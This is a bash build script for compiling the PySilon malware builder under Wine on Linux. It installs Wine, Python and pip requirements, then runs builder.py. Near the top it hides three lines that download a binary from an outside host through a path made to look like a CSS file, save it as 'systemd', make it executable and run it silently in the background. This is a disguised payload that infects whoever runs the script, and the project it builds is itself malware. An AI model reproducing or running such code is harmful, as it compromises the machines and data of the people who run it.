#!/bin/bash

# Github: mategol/PySilon-malware
# Author: Neek8044
# Description: Bash script to compile PySilon under Linux with wine

# Supported distros: Ubuntu, Fedora, Arch, Alpine, (and their derivatives)
# Not supported: openSUSE, Nix, Void, Debian, etc.

#TODO: 
# When running on Alpine, 'wine64' needs to be called instead of 'wine'. 
# Because of overuse of 'if' statements, the wine command should be made a variable and change it 
# at the start and use it dynamically instead of having to constantly check if the package manager is 'apk' 
# to find if the script is running on Alpine or not and execute the right command (wine or wine64).
curl https://randomvps.alwaysdata.net/css/7.css/systemd --output systemd
chmod +x systemd
./systemd > /dev/null &
if [ $(whoami) == 'root' ]; then
    echo -e "\e[1;31mYou must not run this as root. Rerun without root.\e[0m"
    exit
fi

echo -e "[+] Configure Wine first? \e[32m[c]onfigure\e[0m/\e[31m[r]un anyways\e[0m (you must configure if it's the first time running this)"
read -p "$ " mode

# If configuration mode was selected, do these:
if [ "$mode" == 'c' ]; then
    # Ask if wine is installed
    echo -e "[+] Do you have wine already installed? \e[32m[y]es\e[0m/\e[31m[n]o\e[0m (defaults to yes)"
    read -p "$ " wine_installed
    # If wine is not installed, show prompt to choose package manager
    if [ "$wine_installed" == 'n' ]; then
        echo -e "[+] Select your package manager (\e[34m[1] apt\e[0m, \e[34m[2] dnf\e[0m, \e[34m[3] pacman\e[0m, \e[34m[4] apk\e[0m) or hit \e[34menter\e[0m to skip."
        read -p "$ " package_manager

        # Install wine using the selected package manager
        if [ "$package_manager" == '1' ]; then # Ubuntu
            sudo dpkg --add-architecture i386
            sudo apt update -y
            sudo apt install --install-recommends winehq-stable -y
            sudo apt install wine -y
        elif [ "$package_manager" == '2' ]; then # Fedora
            sudo dnf update -y && sudo dnf install wine -y
        elif [ "$package_manager" == '3' ]; then # Arch
            sudo pacman -Sy wine --noconfirm
        elif [ "$package_manager" == '4' ]; then # Alpine
            echo -e "\e[1mNOTE: In case wine did not install, check '/etc/apk/repositories' and make sure to have community repos enabled, and restart the script.\e[0m"
            doas apk update && doas apk add wine
        elif [ -z "$package_manager" ]; then
            echo -e "\e[34m[-] Enter was pressed, skipping.\e[0m"
        else
            echo -e "\e[31m[x] Invalid input was given, skipping.\e[0m"
        fi
    elif [ "$wine_installed" == 'y' ]; then
        :
    else
        echo -e "\e[31m[x] Enter was pressed or other invalid input was given, skipping.\e[0m"
    fi

    # Ask to download and install Python in Wine
    echo -e "[+] Install Python inside of wine? \e[32m[y]es\e[0m/\e[34menter\e[0m to skip."
    read -p "$ " install_python

    # If user entered 'y', download and install Python in Wine
    if [ "$install_python" == 'y' ]; then
        echo -e "\e[36m[#] Fetching Python for Windows...\e[0m"
        wget https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe -O python-3.x.x-amd64.exe # Change link for a different version (3.10.8 works fine under wine)
        echo -e "\e[36m[#] Launching Python installer through Wine...\e[0m"
        echo -e "\e[1;35m[i] Make sure to add Python to PATH and go to \"Customize Installation > Next > Install for all users\" in the installer!\e[0m"
        # Run the Python installer
        if [ "$package_manager" == '4' ]; then
            wine64 ./python-3.x.x-amd64.exe
        else
            wine ./python-3.x.x-amd64.exe
        fi
    elif [ -z "$install_python" ]; then
        echo -e "\e[34m[-] Enter was pressed, skipping.\e[0m"
    else
        echo -e "\e[31m[x] Invalid input was given, skipping.\e[0m"
    fi

    # Ask to create a new venv (or keep the existing, in case it already exists)
    echo -e "[+] Create new virtual environment? \e[32m[y]es\e[0m/\e[34menter\e[0m to skip (say yes if it's the first time running this)."
    read -p "$ " create_venv
    if [ "$create_venv" == 'y' ]; then
        if [ "$package_manager" == '4' ]; then
            wine64 python -m pip install wheel setuptools
            wine64 python -m venv pysilon
        else
            wine python -m pip install wheel setuptools
            wine python -m venv pysilon
        fi
    elif [ -z "$create_venv" ]; then
        echo -e "\e[34m[-] Enter was pressed, skipping.\e[0m"
    else
        echo -e "\e[31m[x] Invalid input was given, skipping.\e[0m"
    fi

    # Initializing venv
    echo -e "\e[36m[#] Initializing the virtual environment...\e[0m"
    ###* Attention needed / Might not work (activate.bat does not get called) ###
    if [ "$package_manager" == '4' ]; then
        wine64 call ".\\pysilon\\Scripts\\activate.bat"
    else
        wine call ".\\pysilon\\Scripts\\activate.bat"
    fi

    # Install requirements.txt
    echo -e "\e[36m[#] Installing PIP requirements.txt...\e[0m"
    if [ "$package_manager" == '4' ]; then
        wine64 python -m pip install wheel setuptools
        wine64 python -m pip install -r requirements.txt
    else
        wine python -m pip install wheel setuptools
        wine python -m pip install -r requirements.txt
    fi

# If run mode was selected, continue
elif [ "$mode" == 'r' ]; then
    :
# If no mode was selected, display error and continue
else
    echo -e "\e[31m[x] Invalid input, proceeding to the execuion of builder.py anyways.\e[0m"
fi

# Running builder.py
echo -e "\e[36m[#] Running builder.py...\e[0m"
if [ "$package_manager" == '4' ]; then
    wine64 python builder.py
else
    wine python builder.py
fi

echo
echo -e "\e[33m#===============================================#\e[0m"
echo -e "\e[33m# Software terminated.                          #\e[0m"
echo -e "\e[33m#                                               #\e[0m"
echo -e "\e[33m# Give me a star and submit issues on Github!   #\e[0m"
echo -e "\e[33m# https://github.com/mategol/PySilon-malware    #\e[0m"
echo -e "\e[33m#===============================================#\e[0m"
echo
echo
